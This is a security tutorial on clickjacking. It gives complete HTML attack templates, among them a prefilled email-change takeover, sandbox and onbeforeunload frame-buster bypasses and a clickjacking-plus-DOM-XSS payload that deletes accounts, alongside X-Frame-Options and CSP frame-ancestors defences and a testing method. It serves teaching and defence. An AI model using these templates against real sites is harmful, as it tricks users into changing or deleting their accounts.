# Clickjacking (UI Redressing)

Clickjacking is an interface-based attack that deceives users into performing unintended actions on a hidden website by tricking them into clicking on what they believe is legitimate content on a decoy page, achieved by overlaying a transparent iframe of the target website precisely on top of the attacker's decoy content — when the user clicks what appears to be an innocent button on the decoy, they are actually clicking a button or link on the invisible authentic target site. Unlike CSRF, which forges entire requests without any user interaction whatsoever, clickjacking requires the user to physically click — but because the user is manipulated through deceptive visual presentation rather than request forgery, CSRF tokens provide no protection, since the target site's iframe is fully loaded in an authenticated session and all requests occur on-domain as a genuine interaction. The attack's effectiveness stems entirely from CSS manipulation — invisible iframes, precise z-index stacking, and opacity near zero — and its danger lies in the fact that the user believes they are interacting with a safe page while actually authenticating and executing sensitive actions on a completely different site. 

The fundamental principle: **the user's click is real, the session is authentic, the request is on-domain — the deception is purely visual, which is why server-side token-based defences fail entirely and framing restrictions are the only effective prevention**.

## Understanding Clickjacking Mechanics

### How the attack is constructed

**The CSS layering technique at its core:** 

```
Attack architecture (two-layer stack):

Layer 1 (bottom, visible): Decoy website content
→ z-index: 1
→ Fully visible, attractive, convincing
→ Contains fake "Win a prize!", "Claim reward!", etc.
→ Designed to motivate user to click a specific area

Layer 2 (top, invisible): Target website iframe
→ z-index: 2  ← ON TOP of decoy (captures click events!)
→ opacity: 0.00001  ← Invisible to user
→ Precisely positioned so sensitive button aligns with decoy click area

User experience:
User sees: Decoy website with an inviting button
User clicks: What they think is the decoy button
Actual click: Lands on the invisible iframe's button/link above
Result: Action performed on TARGET site, not decoy site
```

**Complete basic clickjacking HTML structure:**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        /* Decoy website layer — visible bottom layer */
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;             /* Below iframe */
        }

        /* Target website iframe — invisible top layer */
        #target_website {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;       /* Invisible but still clickable! */
            z-index: 2;             /* ABOVE decoy — receives clicks! */

            /* Precise positioning to align target button with decoy */
            top: 300px;             /* Move iframe to align "Delete Account"
            left: 60px;             /* button with decoy "Claim Prize" area */
        }
    </style>
</head>
<body>

    <!-- Visible decoy content — what user sees -->
    <div id="decoy_website">
        <h2>Congratulations! You've won!</h2>
        <p>Click the button below to claim your £1000 prize!</p>
        <button style="top:300px; left:60px; position:absolute;">
            CLAIM PRIZE
        </button>
    </div>

    <!-- Invisible authentic website — what actually receives clicks -->
    <iframe id="target_website"
            src="https://vulnerable-website.com/account/settings">
    </iframe>

</body>
</html>
```

```
Visual representation of the attack:

What user sees:              What is actually rendered:
┌─────────────────────┐     ┌─────────────────────┐
│  🎉 You Won! 🎉     │     │  🎉 You Won! 🎉     │ ← Decoy (visible)
│                     │     │                     │
│  Click to claim     │     │  Click to claim     │
│  your prize!        │     │  your prize!        │
│                     │     │  ┌───────────────┐  │
│  [CLAIM PRIZE]      │     │  │[DELETE ACCT]  │  │ ← Iframe (invisible)
│                     │     │  └───────────────┘  │
└─────────────────────┘     └─────────────────────┘

User clicks "CLAIM PRIZE" →  Actually clicks "DELETE ACCOUNT"
```

**Critical CSS properties explained:**

```css
/* opacity: 0.00001 vs opacity: 0 */
opacity: 0;          /* Completely invisible AND may be unclickable
                        in some browser implementations */
opacity: 0.00001;    /* Effectively invisible to human eye
                        BUT treated as visible by browser
                        → Receives click events! ✓ */

/* Why not just display:none or visibility:hidden? */
display: none;        /* Element removed from layout — NOT clickable */
visibility: hidden;   /* Element invisible BUT not clickable */
opacity: ~0;          /* Element invisible AND still clickable ✓ */

/* z-index stacking order */
z-index: 1;   /* Decoy (lower = behind) */
z-index: 2;   /* Iframe (higher = in front = receives click events) */

/* Position types for precise alignment */
position: absolute;  /* Positioned relative to nearest positioned ancestor */
position: relative;  /* Positioned relative to its normal document position */
/* Both used together to control exact pixel-level alignment */
```

**Opacity threshold detection (browser differences):** 

```
Chrome (historically v76+):
- Detects iframes with very low opacity
- Applies threshold-based protection
- May block very low opacity iframes from receiving pointer events

Firefox:
- Does not apply the same opacity threshold detection
- Low-opacity iframes remain fully interactive

Attacker response:
- Test various opacity values: 0.00001, 0.001, 0.01, 0.1
- Find threshold that bypasses detection while remaining invisible
- Values like 0.1 may be invisible enough in context but above protection threshold
- Context-specific: opacity over white background vs. busy background

Testing in both browsers essential — protection inconsistency means
browser-specific opacity thresholds are not reliable defences
```

## Clickjacking vs. CSRF — Why Tokens Don't Help

### Why CSRF tokens fail against clickjacking 

```
CSRF attack mechanism:
- Forges entire HTTP request from scratch
- Attacker creates request WITHOUT user's session
- CSRF token: "This request didn't come from our forms" → REJECTED
- Token validates request genuinely originated from the site's own forms

Clickjacking attack mechanism:
- Does NOT forge any requests
- Loads the GENUINE target website in an iframe
- User's session: FULLY AUTHENTICATED (real session cookies sent)
- User's click: GENUINE (on the real site's DOM)
- CSRF token: Legitimately present in the real site's form
- Token validation: PASSES (this IS a genuine on-domain form submission!)

The fundamental difference:
CSRF: Attacker makes request on behalf of user
Clickjacking: User unknowingly makes request themselves, on the real site

From the target server's perspective:
Clickjacking request = indistinguishable from legitimate user interaction
- Same origin: ✓ (iframe is the real site)
- CSRF token: ✓ (loaded from real site's form)
- Session cookie: ✓ (authentic user session)
- HTTP headers: ✓ (all correct)

There is NO server-side signal that a click came from a clickjacking attack
The only defence: PREVENT THE IFRAME FROM LOADING IN THE FIRST PLACE
```

## Attack Variations

### Prefilled form input clickjacking 

**Using GET parameters to pre-populate forms:**

```
Many applications support URL-based form pre-population:
https://vulnerable.com/account/update?email=new@address.com
→ Form loads with email field pre-filled

Attacker advantage:
- Entire attack URL can be crafted by attacker
- Target URL becomes: https://vulnerable.com/account/update?email=attacker@evil.com
- User just needs to click "Submit" / "Save"
- Attacker controls what gets submitted — no typing required from victim
```

```html
<!-- Clickjacking with prefilled form attack -->
<head>
    <style>
        #target_website {
            position: relative;
            width: 400px;
            height: 500px;
            opacity: 0.00001;
            z-index: 2;
            top: 200px;     /* Align "Submit" button with decoy button */
            left: 100px;
        }

        #decoy_website {
            position: absolute;
            width: 400px;
            height: 600px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="decoy_website">
        <h2>Update Your Newsletter Preferences</h2>
        <p>Click below to update your preferences:</p>
        <!-- Decoy button aligns precisely with target's "Submit" button -->
        <button style="position:absolute; top:200px; left:100px">
            Update Preferences
        </button>
    </div>

    <!-- Target site form pre-populated with attacker's email via GET param -->
    <iframe id="target_website"
            src="https://vulnerable-website.com/email/change-email?email=attacker@evil-user.net&confirm=attacker@evil-user.net">
    </iframe>
</body>
```

```
Attack flow:
1. Target site loads in iframe:
   /change-email?email=attacker@evil-user.net
   → Form renders pre-populated with attacker's email

2. User sees decoy "Update Newsletter Preferences" button

3. User clicks what they think is "Update Preferences"
   → Actually clicks "Confirm Email Change" on the invisible form

4. Form submits to vulnerable-website.com
   → With attacker's email pre-filled
   → With victim's session cookie
   → With valid CSRF token (from the genuine form)

5. Email changed to attacker@evil-user.net
   → Attacker can now trigger password reset
   → Account fully compromised!
```

### Frame busting scripts and their bypasses

**Client-side frame busting — how it works:** 

```javascript
// Common frame busting script patterns:

// Pattern 1: Top-level check
if (top !== self) {
    top.location = self.location;  // Break out of any iframe
}

// Pattern 2: Parent location override
if (top.location != self.location) {
    parent.location = self.location;
}

// Pattern 3: Visibility enforcement
if (top !== self) {
    document.body.style.display = 'none';  // Hide content if framed
    top.location = self.location;
}

// Pattern 4: Defensive wrapper
try {
    if (top.location !== self.location) {
        top.location.replace(self.location);
    }
} catch(e) {
    // SecurityError trying to access cross-origin top.location
    document.body.style.display = 'none';
}
```

**Why frame busting scripts are unreliable:**

```
Problem 1: JavaScript can be disabled
→ User or extension disables JS
→ Frame buster never runs
→ Clickjacking unimpeded

Problem 2: NoScript and browser extensions
→ Extensions block scripts selectively
→ Frame buster blocked while site still renders

Problem 3: Browser and platform inconsistencies
→ Mobile browsers may behave differently
→ Script execution timing issues in some environments

Problem 4: onBeforeUnload bypass (OWASP documented)
Attacker registers onBeforeUnload on top frame:
window.onbeforeunload = function() {
    return "Do you want to leave this page?";
};

When frame buster tries: top.location = self.location
→ Triggers onbeforeunload dialog
→ User clicks "Cancel" (staying on page)
→ Navigation cancelled → frame buster neutralised!

Problem 5: Double iframe nesting bypass:
Attacker frame structure:
attacker_top.html
  └── attacker_middle.html  (iframe)
        └── victim.com      (iframe)

Frame buster: "is top === self?" → NO → try parent.location = self.location
But: parent is attacker_middle.html
parent.location = self.location: causes navigation in middle frame
Top frame (attacker_top.html) never navigated!
Victim still framed!
```

**The sandbox attribute bypass — most reliable:** 

```html
<!-- BYPASS: HTML5 sandbox attribute neutralises frame busters -->

<!-- This neutralises JavaScript-based frame busting: -->
<iframe src="https://victim-website.com"
        sandbox="allow-forms">
</iframe>

<!-- 
sandbox="allow-forms":
✓ HTML forms can be submitted (attack still works!)
✗ JavaScript DISABLED inside iframe (frame buster cannot run!)
✗ Top-level navigation disabled (frame buster can't redirect)
✗ Plugins disabled

Result:
- Frame buster script: NEUTRALISED (JavaScript disabled)
- Form submission: STILL WORKS (allow-forms present)
- Attack: SUCCEEDS

Even adding allow-scripts without allow-top-navigation:
-->
<iframe src="https://victim-website.com"
        sandbox="allow-forms allow-scripts">
</iframe>
<!--
sandbox="allow-forms allow-scripts":
✓ HTML forms work
✓ JavaScript works inside iframe
✗ Top-level navigation STILL disabled (allow-top-navigation absent!)

Frame buster runs:
if (top !== self) { top.location = self.location; }
→ Tries to set top.location
→ SecurityError / silently fails
   (sandbox blocks top-level navigation without allow-top-navigation)
→ Frame buster script runs but CANNOT navigate top frame
→ Attack still succeeds!
-->
```

**Sandbox attribute values relevant to clickjacking:**

```
sandbox="" (empty — maximum restriction):
→ Disables: scripts, forms, plugins, navigation, everything
→ Breaks attack (no form submission possible)

sandbox="allow-forms":
→ Enables: form submission only
→ Disables: JavaScript (frame buster neutralised!)
→ Disables: top-level navigation
→ Attack: works for form-based clickjacking

sandbox="allow-scripts":
→ Enables: JavaScript execution
→ Disables: top-level navigation (frame buster fails)
→ Disables: form submission
→ Attack: works for link/button click based actions

sandbox="allow-forms allow-scripts":
→ Enables: JavaScript + forms
→ Disables: top-level navigation (frame buster STILL fails!)
→ Attack: works — JavaScript runs but frame buster cannot redirect
→ Most useful sandbox value for clickjacking via frame busting bypass

sandbox="allow-forms allow-scripts allow-top-navigation":
→ Enables: navigation — frame buster WOULD work
→ But attacker would not set allow-top-navigation!
→ Attacker controls sandbox value — just omit allow-top-navigation
```

### Combining clickjacking with DOM XSS

**Why the combination is particularly powerful:** 

```
Standalone clickjacking:
- Limited to existing UI interactions (click existing buttons/links)
- Attacker constrained by what authentic UI actions are available
- No code injection — just UI manipulation

Clickjacking + DOM XSS:
- Attacker injects JavaScript via XSS payload in URL parameter
- Clickjacking delivers the click that triggers the XSS
- Combined attack enables arbitrary code execution via user click
- If DOM XSS via GET parameter exists: attacker controls WHAT executes
```

```
Scenario:
Target site has DOM XSS in search parameter:
https://vulnerable.com/search?query=<script>ATTACKER_JS</script>

Attacker constructs iframe target URL:
https://vulnerable.com/search?query=<img src=1 onerror="
    fetch('/account/delete', {
        method: 'POST',
        credentials: 'include'
    });
">

Clickjacking attack:
1. Load this URL in invisible iframe
2. Overlay invisible "Search" button with decoy "Win Prize" button
3. User clicks decoy
4. DOM XSS payload executes in victim's authenticated context
5. Account deleted / data stolen / any JS action performed

Result:
Clickjacking delivers the DOM XSS trigger
DOM XSS executes attacker's arbitrary JavaScript
The two vulnerabilities together achieve far more than either alone
```

**Full combined attack template:**

```html
<head>
    <style>
        #xss_iframe {
            position: relative;
            width: 700px;
            height: 500px;
            opacity: 0.00001;
            z-index: 2;
            top: 180px;
            left: 50px;
        }
        #decoy {
            position: absolute;
            z-index: 1;
        }
    </style>
</head>
<body>
    <!-- Decoy content -->
    <div id="decoy">
        <h1>Check Your Security Score!</h1>
        <button style="position:absolute; top:180px; left:50px;
                       padding:15px 30px; font-size:18px;">
            Scan My Account
        </button>
    </div>

    <!-- 
    Target URL injects XSS payload:
    The URL parameter triggers DOM XSS on the target site.
    User clicking in the iframe area triggers the XSS execution.
    -->
    <iframe id="xss_iframe"
            src="https://vulnerable.com/feedback?name=<img src=1 onerror=print()>">
    </iframe>
</body>
```

### Multistep clickjacking

**Attacks requiring sequential user interactions:** 

```
Scenario: Deleting an account requires two clicks:
1. Click "Delete Account" button
2. Click "Confirm Deletion" in dialog

Single-click clickjacking: insufficient (only one click captured)

Multistep solution:
- Multiple carefully positioned decoy buttons
- Matching multiple target site interactions in sequence
- Each decoy aligns with successive target site action

Difficulty for attacker:
- Requires precise positioning for each sequential click
- Decoy must remain convincing across multiple interactions
- User must not notice discrepancy between clicks
- Page state changes between clicks must be accounted for
```

```html
<!-- Multistep clickjacking skeleton -->
<head>
    <style>
        /* Step 1 iframe position */
        #step1_iframe {
            position: relative;
            opacity: 0.00001;
            z-index: 2;
            top: 200px;       /* Aligns with first target action */
            left: 60px;
        }

        /* Step 2 iframe position (if different page loads after step 1) */
        /* Or: different div/button alignment for same page state */
        #step2_overlay {
            position: absolute;
            top: 350px;       /* Aligns with confirmation button */
            left: 60px;
            z-index: 2;
        }
    </style>
</head>
<body>
    <!-- 
    Step 1: First iframe loads target site at action page
    After user "clicks" step 1, target site transitions to confirmation
    -->
    <div id="decoy">
        <!-- Decoy button 1 aligned with step 1 target action -->
        <button id="decoy_btn_1" style="position:absolute; top:200px; left:60px">
            Claim First Prize
        </button>

        <!-- Decoy button 2 aligned with step 2 target confirmation -->
        <!-- Initially hidden, shown after step 1 interaction -->
        <button id="decoy_btn_2" style="position:absolute; top:350px; left:60px"
                onclick="alert('Congratulations! Prize incoming!')">
            Claim Bonus Prize
        </button>
    </div>

    <iframe id="target_iframe"
            src="https://vulnerable-website.com/account/delete">
    </iframe>
</body>
```

## Prevention — Server-Side Defences

### Defence 1: X-Frame-Options header

**The original clickjacking defence:** 

```http
X-Frame-Options: DENY
→ Page cannot be embedded in ANY frame, iframe, or object
→ Strongest setting — prevents all framing
→ Browser will refuse to render the page in a frame

X-Frame-Options: SAMEORIGIN
→ Page can only be framed by pages from the same origin
→ Allows legitimate same-site embedding (e.g., own SPA)
→ Blocks all cross-origin framing attacks

X-Frame-Options: ALLOW-FROM https://trusted-site.com
→ Page can only be framed by the specified origin
→ Deprecated: NOT supported in Chrome 76+, Safari 12+
→ Use CSP frame-ancestors instead for specific origin allowlisting
```

**X-Frame-Options implementation:**

```javascript
// Express.js — Apply to all responses:
const helmet = require('helmet');

app.use(helmet.frameguard({ action: 'deny' }));
// Sets: X-Frame-Options: DENY

// Or manually:
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// Per-route (for pages that need framing allowed for specific features):
app.get('/embeddable-widget', (req, res) => {
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.sendFile('widget.html');
});
```

```python
# Django — Middleware configuration:
# settings.py
MIDDLEWARE = [
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    ...
]

# Default behaviour (after adding middleware):
X_FRAME_OPTIONS = 'DENY'      # Deny all framing
X_FRAME_OPTIONS = 'SAMEORIGIN' # Allow only same origin

# Per-view override:
from django.views.decorators.clickjacking import xframe_options_exempt
@xframe_options_exempt
def embeddable_view(request):
    # This view deliberately allows framing
    return render(request, 'embeddable.html')
```

```java
// Spring Security:
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                .frameOptions()
                    .deny()   // X-Frame-Options: DENY
                    // .sameOrigin()  → X-Frame-Options: SAMEORIGIN
    }
}
```

```php
// PHP:
header('X-Frame-Options: DENY');

// Apache .htaccess or httpd.conf:
Header always set X-Frame-Options "DENY"

// Nginx nginx.conf:
add_header X-Frame-Options "DENY" always;
```

**X-Frame-Options limitations:** 

```
Limitations of X-Frame-Options:
1. ALLOW-FROM deprecated: Not supported in Chrome, Safari, modern browsers
   → Cannot use X-Frame-Options alone for specific trusted origin allowlisting

2. One value only: Cannot allow multiple origins
   X-Frame-Options: ALLOW-FROM a.com, b.com  ← NOT VALID

3. Only checks top-level frame: Does not validate the full ancestor chain
   Attacker nests: evil.com → middle.com → victim.com
   X-Frame-Options on victim sees top frame = evil.com → blocks
   BUT: If X-Frame-Options set to ALLOW-FROM middle.com (legacy):
   middle.com could be used as intermediary — CSP frame-ancestors is better

4. Now deprecated per PortSwigger research recommendation:
   "X-Frame-Options is now deprecated — use frame-ancestors directive instead"
   Should still be set for backwards compatibility with legacy browsers
   But CSP frame-ancestors is the primary modern defence
```

### Defence 2: Content Security Policy (CSP) frame-ancestors

**The modern, recommended clickjacking defence:** 

```http
Prevent ALL framing (equivalent to X-Frame-Options: DENY):
Content-Security-Policy: frame-ancestors 'none';

Allow framing only by same origin (equivalent to SAMEORIGIN):
Content-Security-Policy: frame-ancestors 'self';

Allow framing by specific trusted origins:
Content-Security-Policy: frame-ancestors https://trusted-site.com;

Allow multiple trusted origins (not possible with X-Frame-Options!):
Content-Security-Policy: frame-ancestors 'self' https://partner.com https://dashboard.company.com;

Allow subdomain wildcard (not possible with X-Frame-Options!):
Content-Security-Policy: frame-ancestors 'self' https://*.company.com;

Combined: self plus external partner:
Content-Security-Policy: frame-ancestors 'self' https://analytics-provider.com;
```

**CSP frame-ancestors vs. X-Frame-Options:** 

```
Feature                         | X-Frame-Options    | CSP frame-ancestors
-------------------------------|--------------------|-----------------------
Multiple allowed origins       | NO                 | YES
Wildcard subdomain support     | NO                 | YES
Full ancestor chain validation | NO (top only)      | YES (every ancestor)
Deprecation status             | Deprecated         | Current/recommended
Browser support                | Universal (legacy) | All modern browsers
Syntax                         | Simple header      | CSP directive
Combination with other CSP     | NO                 | YES (one header)
```

**Why CSP validates the full ancestor chain:**

```
Attack using nested iframes:
evil.com
  └── legitimate-partner.com  (X-Frame-Options: ALLOW-FROM legitimate-partner.com)
        └── victim.com         (X-Frame-Options: ALLOW-FROM legitimate-partner.com)

X-Frame-Options on victim.com:
Checks: Is top frame = legitimate-partner.com? NO (it's evil.com)
→ Blocks?... depends on browser implementation

CSP frame-ancestors on victim.com:
Checks ENTIRE ancestor chain:
- Is parent (legitimate-partner.com) in frame-ancestors? YES
- Is grandparent (evil.com) in frame-ancestors? NO!
→ BLOCKED regardless of intermediate frame

CSP frame-ancestors provides defence even against nested iframe tricks
```

**CSP frame-ancestors implementation:**

```javascript
// Express.js with helmet:
const helmet = require('helmet');

// Maximum security — no framing allowed:
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'none'"],
        // ... other CSP directives
    }
}));

// Allow same-origin embedding:
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'self'"],
    }
}));

// Allow specific partner + self:
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'self'", "https://dashboard.company.com"],
    }
}));
```

```python
# Django — using django-csp:
# settings.py
MIDDLEWARE = [
    'csp.middleware.CSPMiddleware',
    ...
]

CSP_FRAME_ANCESTORS = ("'none'",)      # Block all framing
# CSP_FRAME_ANCESTORS = ("'self'",)    # Same origin only
# CSP_FRAME_ANCESTORS = ("'self'", "https://partner.com")
```

```nginx
# Nginx — set both headers for maximum compatibility:
add_header Content-Security-Policy "frame-ancestors 'none'" always;
add_header X-Frame-Options "DENY" always;    # Legacy browser fallback
```

```apache
# Apache:
Header always set Content-Security-Policy "frame-ancestors 'none'"
Header always set X-Frame-Options "DENY"
```

**Why set both headers together:**

```
Recommended defence-in-depth approach:
Set BOTH X-Frame-Options AND CSP frame-ancestors

Reason:
Older browsers: Understand X-Frame-Options, may not support CSP frame-ancestors
Modern browsers: Prefer CSP frame-ancestors, also understand X-Frame-Options

With both headers:
→ Legacy browsers protected by X-Frame-Options
→ Modern browsers protected by CSP frame-ancestors (more robust)
→ Maximum coverage across all browser versions

Example (both headers):
Content-Security-Policy: frame-ancestors 'none'; default-src 'self'; ...
X-Frame-Options: DENY

Modern browser: Uses frame-ancestors (ignores X-Frame-Options)
Legacy browser: Uses X-Frame-Options (ignores frame-ancestors)
Result: All browsers protected
```

### Defence 3: Comprehensive secure implementation

**Complete server security header setup:**

```javascript
// Node.js/Express — full clickjacking prevention stack
const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(helmet({
    // Clickjacking prevention
    frameguard: { action: 'deny' },           // X-Frame-Options: DENY

    contentSecurityPolicy: {
        directives: {
            frameAncestors: ["'none'"],        // CSP: frame-ancestors 'none'
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'"],
            imgSrc: ["'self'", "data:"],
            // ... other directives
        }
    },

    // Additional security headers (defence in depth)
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    noSniff: true,          // X-Content-Type-Options: nosniff
    xssFilter: true,        // X-XSS-Protection: 1; mode=block (legacy)
}));

// Application requiring partial embedding:
// (e.g., a payment widget that partners embed)
app.get('/payment-widget', (req, res) => {
    // Only allow specific partner to embed this endpoint
    res.setHeader(
        'Content-Security-Policy',
        "frame-ancestors 'self' https://partner.merchant.com"
    );
    // Override the global DENY header for this specific route
    res.removeHeader('X-Frame-Options');
    res.setHeader('X-Frame-Options', 'ALLOW-FROM https://partner.merchant.com');
    // Note: ALLOW-FROM deprecated — CSP frame-ancestors is the real protection here
    res.render('payment-widget');
});
```

## Detecting Clickjacking Vulnerabilities

### Testing methodology

**Step 1: Check for framing protection headers**

```http
Make a GET request to each sensitive page and check for:
1. X-Frame-Options header in response
2. Content-Security-Policy header with frame-ancestors directive

Vulnerable (no protection):
HTTP/1.1 200 OK
Content-Type: text/html
(No X-Frame-Options)
(No CSP frame-ancestors)

Protected:
HTTP/1.1 200 OK
Content-Type: text/html
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'; ...
```

**Step 2: Attempt to load in iframe**

```html
<!-- Quick manual test: try to embed the target page -->
<!DOCTYPE html>
<html>
<body>
<p>Test: can this page be framed?</p>
<iframe src="https://target-website.com/sensitive-page"
        width="800" height="600">
</iframe>
<!-- 
If iframe renders target site content: VULNERABLE to clickjacking!
If iframe shows error / blank: Protected (X-Frame-Options or CSP blocking it)
Browser console will show the specific error:
"Refused to display in frame because it set 'X-Frame-Options' to 'deny'"
or
"Refused to frame because an ancestor violates CSP frame-ancestors"
-->
</body>
</html>
```

**Step 3: Assess exploitability factors**

```
Higher exploitability:
✓ Sensitive authenticated actions on vulnerable pages
  (delete account, change email, make payment, admin actions)
✓ Actions completable with single click
✓ Actions completable via GET (prefilled URL possible)
✓ No user re-authentication required for sensitive actions
✓ Predictable/stable UI layout for iframe alignment

Lower exploitability:
→ Only low-sensitivity actions available on frameable pages
→ Actions require complex multi-step interaction
→ Site requires re-authentication for sensitive operations
→ Layout changes unpredictably (harder to align)
→ Anti-automation checks (rate limiting, CAPTCHA)
```

**Step 4: Assess frame busting bypass potential**

```
Test if frame busting scripts are present:
→ View source of target page
→ Look for: top !== self, top.location, parent.location patterns
→ If present: test sandbox bypass

Test sandbox bypass:
<iframe src="https://target.com" sandbox="allow-forms">
→ Does form still submit? BYPASS SUCCESSFUL

Test sandbox with scripts:
<iframe src="https://target.com" sandbox="allow-forms allow-scripts">
→ Does frame buster fail to navigate? BYPASS SUCCESSFUL
```
